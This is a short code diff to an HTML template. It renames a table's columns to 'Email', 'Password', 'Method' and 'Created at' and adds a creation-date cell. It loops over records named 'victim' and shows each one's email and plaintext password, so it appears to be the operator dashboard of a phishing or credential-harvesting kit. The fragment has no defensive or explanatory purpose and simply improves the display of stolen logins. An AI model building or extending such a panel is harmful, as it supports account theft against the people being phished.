@@ -194,9 +194,10 @@
       <thead>
         <tr>
           <th scope="col">#</th>
-          <th scope="col">First</th>
-          <th scope="col">Last</th>
-          <th scope="col">Handle</th>
+          <th scope="col">Email</th>
+          <th scope="col">Password</th>
+          <th scope="col">Method</th>
+          <th scope="col">Created at</th>
         </tr>
       </thead>
       <tbody>
@@ -205,6 +206,7 @@
           <td>{{ victim.email }}</td>
           <td>{{ victim.password }}</td>
           <td>{{ victim.method }}</td>
+          <td>{{ victim.created_at }}</td>
         </tr>
       </tbody>
     </table>
